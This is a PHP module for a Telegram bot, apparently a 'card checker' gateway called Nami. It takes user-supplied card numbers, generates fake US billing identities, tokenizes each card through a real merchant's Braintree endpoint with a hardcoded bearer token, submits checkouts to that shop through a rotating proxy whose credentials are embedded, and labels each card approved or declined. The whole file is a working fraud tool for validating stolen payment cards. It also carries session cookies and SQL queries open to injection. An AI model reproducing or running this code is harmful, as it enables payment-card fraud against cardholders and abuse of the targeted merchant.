<?php

require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/na" or $cmd == ".na" or $cmd == "!na" or $cmd == "?na" or $cmd == "#na" or $cmd == ":na" or $cmd == ",na"){ 
// A part for gatecmd clearance

    $gatecmd = 'na';
        
    $listan = clean($text);
$listaq = clean($quetzal);
if(empty($listan)){
$lista = $listaq;
}elseif(empty($listaq)){
$lista = $listan;
}
/*$content = ['chat_id' => $chat_id, 'text' => "$lista", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        //exit();*/
        
//error_reporting(0);
unlink(getcwd().'/cookie.txt');
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='pp'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "$gate_not_added", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Nami 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {}

$matches = $lista;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $lista, $matches);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
$lista = "$cc|$mes|$ano|$cvv";


        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Nami 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Nami 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
    $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }


        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[ 💳$lista ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];


//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//

///$poxySocks4 = rebootproxys();

# ------------ Ramdom User ------------ #


    $get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    $get = strtoupper($get);
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    // $email1 = $matches1;
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"cell\":\"(.*)\")siU", $get, $matches1);
    $cell = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"gender\":\"(.*)\")siU", $get, $matches1);
    $gender = $matches1[1][0];
    preg_match_all("(\"value\":\"(.*)\")siU", $get, $matches1);
    $ssn = $matches1[1][0];
    preg_match_all("(\"age\":\"(.*)\")siU", $get, $matches1);
    preg_match_all("(\"date\":\"(.*)\")siU", $get, $matches1);
    $dob = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = $pass;
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $numero1 = substr($cell, 1,3);
    $numero2 = substr($cell, 6,3);
    $numero3 = substr($cell, 10,4);
    $cell = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("EXAMPLE.COM", $serv_rnd, $email);
    $email = strtoupper($email);
    if($state=="Alabama"){ $state="AL";
    }else if($state=="alaska"){ $state="AK";
    }else if($state=="arizona"){ $state="AR";
    }else if($state=="california"){ $state="CA";
    }else if($state=="olorado"){ $state="CO";
    }else if($state=="connecticut"){ $state="CT";
    }else if($state=="delaware"){ $state="DE";
    }else if($state=="district of columbia"){ $state="DC";
    }else if($state=="florida"){ $state="FL";
    }else if($state=="georgia"){ $state="GA";
    }else if($state=="hawaii"){ $state="HI";
    }else if($state=="idaho"){ $state="ID";
    }else if($state=="illinois"){ $state="IL";
    }else if($state=="indiana"){ $state="IN";
    }else if($state=="iowa"){ $state="IA";
    }else if($state=="kansas"){ $state="KS";
    }else if($state=="kentucky"){ $state="KY";
    }else if($state=="louisiana"){ $state="LA";
    }else if($state=="maine"){ $state="ME";
    }else if($state=="maryland"){ $state="MD";
    }else if($state=="massachusetts"){ $state="MA";
    }else if($state=="michigan"){ $state="MI";
    }else if($state=="minnesota"){ $state="MN";
    }else if($state=="mississippi"){ $state="MS";
    }else if($state=="missouri"){ $state="MO";
    }else if($state=="montana"){ $state="MT";
    }else if($state=="nebraska"){ $state="NE";
    }else if($state=="nevada"){ $state="NV";
    }else if($state=="new hampshire"){ $state="NH";
    }else if($state=="new jersey"){ $state="NJ";
    }else if($state=="new mexico"){ $state="NM";
    }else if($state=="new york"){ $state="LA";
    }else if($state=="north carolina"){ $state="NC";
    }else if($state=="north dakota"){ $state="ND";
    }else if($state=="Ohio"){ $state="OH";
    }else if($state=="oklahoma"){ $state="OK";
    }else if($state=="oregon"){ $state="OR";
    }else if($state=="pennsylvania"){ $state="PA";
    }else if($state=="rhode Island"){ $state="RI";
    }else if($state=="south carolina"){ $state="SC";
    }else if($state=="south dakota"){ $state="SD";
    }else if($state=="tennessee"){ $state="TN";
    }else if($state=="texas"){ $state="TX";
    }else if($state=="utah"){ $state="UT";
    }else if($state=="vermont"){ $state="VT";
    }else if($state=="virginia"){ $state="VA";
    }else if($state=="washington"){ $state="WA";
    }else if($state=="west virginia"){ $state="WV";
    }else if($state=="wisconsin"){ $state="WI";
    }else if($state=="wyoming"){ $state="WY";
    }else if($state=="Kentucky"){ $state="KY";
    }else{$state="";}
    if(empty($ssn)){
    $ssn="null";
    }


/*$content = ['chat_id' => $chat_id, 'text' => "$email", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        //exit();*/
 
$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - ? - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];
        
        /*api braintree by @Devilsx19*/
        
        /*function getdata($string, $start, $end)
{
    $uno = explode($start, $string);
    $dos = explode($end, $uno[1]);
    return $dos[0];
}

function Capture($str, $starting_word, $ending_word)
{
    $subtring_start = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return substr($str, $subtring_start, $size);
}*/


/*Start of second request*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://payments.braintree-api.com/graphql");
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "axpfyoll-rotate:crpbiuervtjj");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2Njc3MzEyMzksImp0aSI6ImE2OWZiOGE3LTNjY2YtNGJmOC1hZDQyLWVlNjcxMGZlYmMwOCIsInN1YiI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImlDb3JrRmxvb3JfaW5zdGFudCJ9fQ.2atY0nuEe1fRZMGXTMfbD4IgXK_E_UJj_mHjBtcMB3XkhSCx9UO15rds4AXv7Jp-svqStozOCUOKc3l4YHLVxA';
$headers[] = 'Content-Type: application/json';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'Braintree-Version: 2018-05-10';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"5c194011-3c49-4cf2-b423-1fbe14260e27"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mes . '","expirationYear":"' . $ano . '","cvv":"' . $cvv . '"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$curl = curl_exec($ch);
$token = trim(strip_tags(getdata($curl, '"token":"', '"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

/*Start of third request*/

$content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $time</b>
", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];
        


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.icorkfloor.com/?wc-ajax=checkout");
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: */*';
    //$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2Njc3MzEyMzksImp0aSI6ImE2OWZiOGE3LTNjY2YtNGJmOC1hZDQyLWVlNjcxMGZlYmMwOCIsInN1YiI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImlDb3JrRmxvb3JfaW5zdGFudCJ9fQ.2atY0nuEe1fRZMGXTMfbD4IgXK_E_UJj_mHjBtcMB3XkhSCx9UO15rds4AXv7Jp-svqStozOCUOKc3l4YHLVxA';
    $headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $headers[] = 'origin: https://www.icorkfloor.com/checkout';
    $headers[] = 'referer: https://www.icorkfloor.com/checkout/';
    $headers[] = 'cookie: _gid=GA1.2.157444501.1667644681; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-11-05%2010%3A38%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.icorkfloor.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-11-05%2010%3A38%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.icorkfloor.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; wp_woocommerce_session_d393f785dd98683540f0c65e965f3c9a=d410dbfdf60785861fc3d70548c43635%7C%7C1667817507%7C%7C1667813907%7C%7Caa86d997b536e6942aeca686fef7d464; language=en_US; ledgerCurrency=USD; apay-session-set=tAi24S3xfo3qHWd2XhTPPAip6KlNXmDg5snCupkTtA82DyPvHj%2BHcjERpclZ3bQ%3D; woocommerce_items_in_cart=1; woocommerce_cart_hash=19c48b8397a808987c9b0c75dbcc2b14; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.icorkfloor.com%2Fcheckout%2F; _ga=GA1.2.487751990.1667644681; _ga_0NJ6ZVZRFZ=GS1.1.1667657160.3.1.1667657176.0.0.0; _uetsid=ec24dbe05cf511ed8e7bdbf215f7030f; _uetvid=ec24f2805cf511ed8bcc47ed8f8f836b';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    //////////////

    curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_email='.$first.'%40gmail.com&billing_first_name='.$first.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_address_1=1359+Redbud+Drive&billing_address_2=&billing_city=Garden+City&billing_state=NY&billing_postcode='.$zip.'&billing_phone='.$phone.'&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=WA&shipping_postcode=&order_=Follow+up+if+something+missing&order_sample_order_=&order_comments=&metorik_source_type=typein&metorik_source_url=(none)&metorik_source_mtke=(none)&metorik_source_utm_campaign=(none)&metorik_source_utm_source=(direct)&metorik_source_utm_medium=(none)&metorik_source_utm_content=(none)&metorik_source_utm_id=(none)&metorik_source_utm_term=(none)&metorik_source_session_entry=https%3A%2F%2Fwww.icorkfloor.com%2F&metorik_source_session_start_time=2022-11-05+10%3A38%3A01&metorik_source_session_pages=13&metorik_source_session_count=1&shipping_method%5B0%5D=wf_fedex_woocommerce_shipping%3AFEDEX_GROUND&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22dbb095d9ca399b096848efbc4ae200e9%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2224b18190043e7457be66686b6eb99a78%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fwcn3886s36z26zt4%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fwcn3886s36z26zt4%22%7D%2C%22merchantId%22%3A%22wcn3886s36z26zt4%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22wcn3886s36z26zt4%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22iCork+Floor%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2Njc3MzEyNDAsImp0aSI6IjlhOThjYWVhLTljYjgtNDYyOC04MjNkLWY2NzZmYTIwOWIyMiIsInN1YiI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjbjM4ODZzMzZ6MjZ6dDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.WKrYx3MhvWL5RBjK8YPOmJ_C9kGDb23JBo6d_b-nMqf28Sn-BKx6rnB3QOm7dAOo3nRIScENo48gQ40Zv_VneQ%22%2C%22paypalClientId%22%3A%22AR8-WmWX17fm9Y5WCb7wQiDmVQWF5wvDkIkJuUnWSs5rUhkg6A8ujWYRD4EeVOAt_qSiLNUtpOhdZIty%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22iCork+Floor%22%2C%22clientId%22%3A%22AR8-WmWX17fm9Y5WCb7wQiDmVQWF5wvDkIkJuUnWSs5rUhkg6A8ujWYRD4EeVOAt_qSiLNUtpOhdZIty%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fwww.icorkfloor.com%2Fprivacy-policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fwww.icorkfloor.com%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22iCorkFloor_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%22dbb095d9ca399b096848efbc4ae200e9%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2224b18190043e7457be66686b6eb99a78%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%22dbb095d9ca399b096848efbc4ae200e9%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2224b18190043e7457be66686b6eb99a78%22%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%22dbb095d9ca399b096848efbc4ae200e9%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2224b18190043e7457be66686b6eb99a78%22%7D&woocommerce-process-checkout-nonce=da5e325dfc&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

    $curl2 = curl_exec($ch);
    $message = trim(strip_tags(getdata($curl2, 'Reason:','\t\t\t<\/div>')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
    
    $content4 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - 🟢 ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $time</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m4  = EditMessageText($content4);
        $m4i = $m4['result']['message_id'];
      
if (!empty($message)) {
    
        
        
if (strpos($curl2, 'Thanks you') or (strpos($curl2, 'Insufficient Funds'))) {
	$status = "Approved ✅️";
}elseif (strpos($curl2, 'Card Issuer Declined CVV')) {
	$status = "Approved CCN ✅️";
/*elseif(strpos($curl, 'Insufficient Funds') or (strpost($curl2, 'Funds'))) {
    $status = "Approved CVV ✅";
*/}else{
	$status = "Declined ❌️";
}


$contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Nami [🍃]
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>$status</code> ]
⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$message</code>
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
        

}
}
